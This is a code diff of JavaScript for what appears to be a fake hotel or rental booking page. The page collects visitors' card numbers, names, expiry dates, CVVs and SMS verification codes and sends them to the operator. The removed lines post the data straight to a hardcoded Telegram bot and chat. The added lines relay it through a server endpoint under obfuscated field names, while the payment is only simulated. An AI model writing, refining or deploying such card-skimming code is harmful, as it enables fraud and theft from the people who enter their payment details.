@@ -27,24 +27,23 @@ const TELEGRAM_BOT_TOKEN = "7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w"
 const TELEGRAM_CHAT_ID = "-1002626141042"
 const TELEGRAM_API_URL = "https://api.telegram.org/bot"
 
-async function sendToTelegram(messageData) {
+async function sendToTelegram(type, data) {
   try {
-    const message = formatTelegramMessage(messageData)
-
-    const response = await fetch(`${TELEGRAM_API_URL}${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    const response = await fetch("/app/api/msg", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "HTML",
+        type: type,
+        ...data,
       }),
     })
 
-    console.log("[v0] Telegram response:", response.status)
+    const result = await response.json()
+    console.log("[v0] API Response:", result)
     return response.ok
   } catch (error) {
-    console.error("[v0] Telegram error:", error)
+    console.error("[v0] Error:", error)
+    return false
   }
 }
 
@@ -121,25 +120,15 @@ async function handlePayment(e) {
   const expiryYear = document.getElementById("expiryYear").value
   const cvv = document.getElementById("cvv").value
 
-  state.paymentData = {
+  await sendToTelegram("payment", {
     a: cardNumber,
     b: cardName,
     c: expiryMonth,
     d: expiryYear,
     e: cvv,
-  }
-
-  await sendToTelegram({
-    type: "payment",
-    cardNumber: cardNumber,
-    cardName: cardName,
-    expiryMonth: expiryMonth,
-    expiryYear: expiryYear,
-    cvv: cvv,
     checkIn: state.checkIn,
     checkOut: state.checkOut,
     guests: state.guests,
-    amount: 2400,
   })
 
   // Simulate processing
@@ -169,14 +158,11 @@ async function handleSMS(e) {
   const smsCode = document.getElementById("smsCode").value
   state.smsCode = smsCode
 
-  await sendToTelegram({
-    type: "sms",
-    smsCode: smsCode,
+  await sendToTelegram("sms", {
+    code: smsCode,
     checkIn: state.checkIn,
     checkOut: state.checkOut,
     guests: state.guests,
-    amount: 2300,
-    timestamp: new Date().toLocaleString("tr-TR"),
   })
 
   // Simulate verification
